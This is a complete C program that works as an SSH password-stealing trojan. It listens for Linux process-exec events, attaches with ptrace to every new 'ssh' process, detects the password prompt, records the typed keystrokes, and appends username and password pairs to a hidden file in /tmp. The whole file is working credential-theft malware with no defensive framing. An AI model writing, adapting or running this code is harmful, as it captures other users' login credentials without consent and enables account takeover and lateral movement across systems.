#define _GNU_SOURCE
#include <errno.h>
#include <linux/cn_proc.h>
#include <linux/connector.h>
#include <linux/netlink.h>
#include <pwd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

#define LOG_FILE        "/tmp/.log_sshtrojan2.txt"
#define MAX_TRACED_PIDS 64

/* ---------- per-PID syscall entry/exit toggle ---------- */

static struct { pid_t pid; int in_entry; } pid_states[MAX_TRACED_PIDS];

static void pid_state_clear(void) {
    memset(pid_states, 0, sizeof(pid_states));
}

static int pid_state_toggle(pid_t pid) {
    for (int i = 0; i < MAX_TRACED_PIDS; i++) {
        if (pid_states[i].pid == pid)
            return (pid_states[i].in_entry ^= 1);
        if (pid_states[i].pid == 0) {
            pid_states[i].pid = pid;
            return (pid_states[i].in_entry = 1); /* first stop = entry */
        }
    }
    return 0;
}

static void pid_state_remove(pid_t pid) {
    for (int i = 0; i < MAX_TRACED_PIDS; i++)
        if (pid_states[i].pid == pid) {
            pid_states[i] = (typeof(pid_states[i])){0};
            return;
        }
}

/* ---------- helpers ---------- */

static void peek_mem(pid_t pid, unsigned long addr, char *buf, size_t len) {
    for (size_t i = 0; i < len; ) {
        errno = 0;
        long w = ptrace(PTRACE_PEEKDATA, pid, addr + i, NULL);
        if (w == -1 && errno) break;
        size_t chunk = (len - i < sizeof(long)) ? len - i : sizeof(long);
        memcpy(buf + i, &w, chunk);
        i += chunk;
    }
    buf[len] = '\0';
}

/* Resolve login username from SSH cmdline, falling back to process UID. */
static void ssh_username(pid_t pid, char *out, size_t outsz) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);
    FILE *fp = fopen(path, "r");
    if (fp) {
        char buf[1024] = {0};
        size_t n = fread(buf, 1, sizeof(buf) - 1, fp);
        fclose(fp);

        char *argv[64] = { buf };
        int argc = 1;
        for (size_t i = 1; i < n && argc < 63; i++)
            if (buf[i] == '\0' && buf[i-1] != '\0')
                argv[argc++] = buf + i + 1;

        for (int i = 1; i < argc - 1; i++)          /* -l user */
            if (argv[i] && !strcmp(argv[i], "-l") && argv[i+1]) {
                snprintf(out, outsz, "%s", argv[i+1]);
                return;
            }
        for (int i = 1; i < argc; i++) {             /* user@host */
            if (!argv[i] || argv[i][0] == '-') continue;
            char *at = strchr(argv[i], '@');
            if (at) {
                size_t u = (size_t)(at - argv[i]);
                if (u >= outsz) u = outsz - 1;
                memcpy(out, argv[i], u);
                out[u] = '\0';
                return;
            }
        }
    }

    /* Fall back to the real UID of the SSH process. */
    snprintf(path, sizeof(path), "/proc/%d/status", pid);
    fp = fopen(path, "r");
    if (fp) {
        char line[128];
        while (fgets(line, sizeof(line), fp)) {
            unsigned int uid;
            if (sscanf(line, "Uid:\t%u", &uid) == 1) {
                struct passwd *pw = getpwuid((uid_t)uid);
                snprintf(out, outsz, "%s", pw ? pw->pw_name : "(unknown)");
                fclose(fp);
                return;
            }
        }
        fclose(fp);
    }
    snprintf(out, outsz, "(unknown)");
}

static void set_trace_opts(pid_t pid) {
    ptrace(PTRACE_SETOPTIONS, pid, 0,
           PTRACE_O_TRACESYSGOOD | PTRACE_O_TRACEFORK |
           PTRACE_O_TRACECLONE   | PTRACE_O_TRACEEXEC);
}

/* ---------- tracer ---------- */

static void attach_and_trace(pid_t pid, const char *user) {
    int  status, traced = 0, capturing = 0, passlen = 0;
    char password[256] = {0};
    FILE *logf = fopen(LOG_FILE, "a");

    pid_state_clear();
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) goto done;
    waitpid(pid, &status, 0);
    set_trace_opts(pid);
    ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
    traced = 1;

    while (traced > 0) {
        pid_t spid = waitpid(-1, &status, 0);
        if (spid == -1) break;

        if (WIFEXITED(status) || WIFSIGNALED(status)) {
            pid_state_remove(spid); traced--; continue;
        }
        if (!WIFSTOPPED(status)) {
            ptrace(PTRACE_SYSCALL, spid, NULL, NULL); continue;
        }

        int evt = status >> 16;

        /* New child from fork/clone — inherit tracing. */
        if (evt == PTRACE_EVENT_FORK || evt == PTRACE_EVENT_CLONE) {
            unsigned long cpid = 0;
            ptrace(PTRACE_GETEVENTMSG, spid, NULL, &cpid);
            waitpid((pid_t)cpid, NULL, WNOHANG);
            set_trace_opts((pid_t)cpid);
            ptrace(PTRACE_SYSCALL, (pid_t)cpid, NULL, NULL);
            traced++;
            ptrace(PTRACE_SYSCALL, spid, NULL, NULL);
            continue;
        }

        /* Syscall-exit stop. */
        if (WSTOPSIG(status) == (SIGTRAP | 0x80) && !pid_state_toggle(spid)) {
            struct user_regs_struct regs;
            ptrace(PTRACE_GETREGS, spid, NULL, &regs);

            /* Arm capture when SSH writes the password prompt. */
            if (regs.orig_rax == SYS_write && (long)regs.rax > 0) {
                long wlen = (long)regs.rax > 255 ? 255 : (long)regs.rax;
                char wbuf[256] = {0};
                peek_mem(spid, regs.rsi, wbuf, (size_t)wlen);
                if (strstr(wbuf, "assword:")) {
                    capturing = 1; passlen = 0;
                    memset(password, 0, sizeof(password));
                }
            }

            /* Accumulate 1-byte reads as password keystrokes. */
            if (capturing && regs.orig_rax == SYS_read && (long)regs.rax == 1) {
                char c = 0;
                peek_mem(spid, regs.rsi, &c, 1);
                if (c == '\n' || c == '\r') {
                    if (passlen > 0 && logf) {
                        password[passlen] = '\0';
                        fprintf(logf, "User: %s | Pass: %s\n", user, password);
                        fflush(logf);
                    }
                    capturing = 0; passlen = 0;
                    memset(password, 0, sizeof(password));
                } else if (c >= 32 && c <= 126 && passlen < 255) {
                    password[passlen++] = c;
                } else if ((c == 127 || c == 8) && passlen > 0) {
                    passlen--;
                }
            }
        }

        ptrace(PTRACE_SYSCALL, spid, NULL, NULL);
    }

done:
    if (logf) fclose(logf);
}

/* ---------- netlink process event monitor ---------- */

struct nlcn_msg {
    struct nlmsghdr       nl_hdr;
    struct cn_msg         cn_msg;
    enum proc_cn_mcast_op cn_mcast;
};

static void on_exec(pid_t pid) {
    char comm[256], path[64];
    snprintf(path, sizeof(path), "/proc/%d/comm", pid);
    FILE *fp = fopen(path, "r");
    if (!fp) return;
    int ok = fgets(comm, sizeof(comm), fp) != NULL;
    fclose(fp);
    if (!ok || strcmp(comm, "ssh\n") != 0) return;

    char user[256];
    ssh_username(pid, user, sizeof(user));
    if (fork() == 0) { attach_and_trace(pid, user); exit(0); }
}

int main(void) {
    struct sockaddr_nl sa = {
        .nl_family = AF_NETLINK,
        .nl_groups = CN_IDX_PROC,
        .nl_pid    = (unsigned)getpid()
    };
    struct nlcn_msg msg = {0};
    msg.nl_hdr.nlmsg_len  = sizeof(msg);
    msg.nl_hdr.nlmsg_pid  = (unsigned)getpid();
    msg.nl_hdr.nlmsg_type = NLMSG_DONE;
    msg.cn_msg.id.idx     = CN_IDX_PROC;
    msg.cn_msg.id.val     = CN_VAL_PROC;
    msg.cn_msg.len        = sizeof(enum proc_cn_mcast_op);
    msg.cn_mcast          = PROC_CN_MCAST_LISTEN;

    int sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_CONNECTOR);
    if (sock == -1 || bind(sock, (struct sockaddr *)&sa, sizeof(sa)) == -1) return 1;
    send(sock, &msg, sizeof(msg), 0);

    char buf[1024];
    while (1) {
        if (recv(sock, buf, sizeof(buf), 0) <= 0) continue;
        struct nlmsghdr   *nl = (struct nlmsghdr *)buf;
        struct cn_msg     *cn = (struct cn_msg *)NLMSG_DATA(nl);
        struct proc_event *ev = (struct proc_event *)cn->data;
        if (ev->what == PROC_EVENT_EXEC)
            on_exec(ev->event_data.exec.process_pid);
    }
}
